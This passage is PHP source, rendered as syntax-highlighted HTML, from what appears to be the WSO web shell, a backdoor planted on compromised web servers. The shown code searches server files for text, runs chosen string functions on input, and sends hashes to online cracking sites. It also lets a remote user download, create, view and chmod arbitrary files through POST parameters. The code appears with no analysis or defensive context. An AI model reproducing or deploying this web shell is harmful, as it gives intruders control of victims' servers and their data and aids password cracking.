    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form name=&#39;toolsForm&#39; onSubmit=&#39;if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;&#39;&amp;gt;&amp;lt;select name=&#39;selectTool&#39;&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$stringTools</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;lt;input type=&#39;submit&#39; value=&#39;&amp;gt;&amp;gt;&#39;/&amp;gt; &amp;lt;input type=checkbox name=ajax value=1 &quot;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; send using AJAX&amp;lt;br&amp;gt;&amp;lt;textarea name=&#39;input&#39; style=&#39;margin-top:5px&#39; class=bigarea&amp;gt;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;pre class=&#39;ml1&#39; style=&#39;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;margin-top:5px&#39; id=&#39;strOutput&#39;&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$stringTools</span><span class="p">))</span><span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]));</span>
    <span class="p">}</span>
    <span class="k">echo</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;Search text in files:&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt; </span>
<span class="s2">       &amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;table cellpadding=&#39;1&#39; cellspacing=&#39;0&#39; width=&#39;50%&#39;&amp;gt; </span>
<span class="s2">           &amp;lt;tr&amp;gt;&amp;lt;td width=&#39;1%&#39;&amp;gt;Text:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;text&#39; style=&#39;width:100%&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt; </span>
<span class="s2">           &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Path:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;cwd&#39; value=&#39;&quot;</span><span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39; style=&#39;width:100%&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt; </span>
<span class="s2">           &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Name:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;filename&#39; value=&#39;*&#39; style=&#39;width:100%&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt; </span>
<span class="s2">           &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;submit&#39; value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt; </span>
<span class="s2">           &amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
 
    <span class="k">function</span> <span class="nf">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
            <span class="nv">$path</span><span class="o">.=</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
        <span class="nv">$paths</span> <span class="o">=</span> <span class="o">@</span><span class="nb">array_unique</span><span class="p">(</span><span class="o">@</span><span class="nb">array_merge</span><span class="p">(</span><span class="o">@</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]),</span> <span class="o">@</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="nx">GLOB_ONLYDIR</span><span class="p">)));</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$paths</span><span class="p">)</span><span class="o">&amp;&amp;@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$paths</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">foreach</span><span class="p">(</span><span class="nv">$paths</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$path</span><span class="o">!=</span><span class="nv">$item</span><span class="p">)</span>
                        <span class="nx">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$item</span><span class="p">),</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span>
                        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">view</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span>
        <span class="nx">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;Search for hash:&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt; </span>
<span class="s2">       &amp;lt;form method=&#39;post&#39; target=&#39;_blank&#39; name=&#39;hf&#39;&amp;gt; </span>
<span class="s2">           &amp;lt;input type=&#39;text&#39; name=&#39;hash&#39; style=&#39;width:200px;&#39;&amp;gt;&amp;lt;br&amp;gt; </span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;hashcrack.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.hashcrack.com/index.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt; </span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;milw0rm.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.milw0rm.com/cracker/search.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt; </span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;hashcracking.info&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;https://hashcracking.info/index.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt; </span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;md5.rednoize.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://md5.rednoize.com/?q=&#39;+document.hf.hash.value+&#39;&amp;s=md5&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt; </span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;md5decrypter.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.md5decrypter.com/&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt; </span>
<span class="s2">       &amp;lt;/form&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionFilesTools</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
            <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mime_content_type&quot;</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: &quot;</span><span class="o">.</span><span class="nv">$type</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span>
                    <span class="k">echo</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mkfile&#39;</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;edit&quot;</span><span class="p">;</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;File tools&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;File not exists&#39;</span><span class="p">;</span>
        <span class="nx">wsoFooter</span><span class="p">();</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
        <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;Name:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Size:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">wsoViewSize</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">:</span><span class="s1">&#39;-&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Permission:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nx">wsoPermsColor</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Owner/Group:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;Create time:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Access time:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Modify time:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">)</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;view&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span>
        <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;View&#39;</span><span class="p">,</span> <span class="s1">&#39;Highlight&#39;</span><span class="p">,</span> <span class="s1">&#39;Download&#39;</span><span class="p">,</span> <span class="s1">&#39;Hexdump&#39;</span><span class="p">,</span> <span class="s1">&#39;Edit&#39;</span><span class="p">,</span> <span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;a href=# onclick=&quot;g(null,null,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">==@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&amp;lt;b&amp;gt;[ &#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39; ]&amp;lt;/b&amp;gt;&#39;</span><span class="o">:</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt; &#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">case</span> <span class="s1">&#39;view&#39;</span><span class="o">:</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=ml1&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span>
                    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;highlight&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=ml1 style=&quot;background-color: #e1e1e1;color:black;&quot;&amp;gt;&#39;</span><span class="p">;</span>
                <span class="nv">$code</span> <span class="o">=</span> <span class="o">@</span><span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="k">true</span><span class="p">);</span>
                <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;&amp;lt;span &#39;</span><span class="p">,</span><span class="s1">&#39;&amp;gt;&amp;lt;/span&amp;gt;&#39;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&amp;lt;font &#39;</span><span class="p">,</span><span class="s1">&#39;&amp;gt;&amp;lt;/font&amp;gt;&#39;</span><span class="p">),</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;chmod&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="nv">$perms</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nv">$i</span><span class="p">)</span>
                    <span class="nv">$perms</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">*</span><span class="nb">pow</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="nv">$i</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$perms</span><span class="p">))</span>
                    <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t set permissions!&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;document.mf.p3.value=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nb">clearstatcache</span><span class="p">();</span>
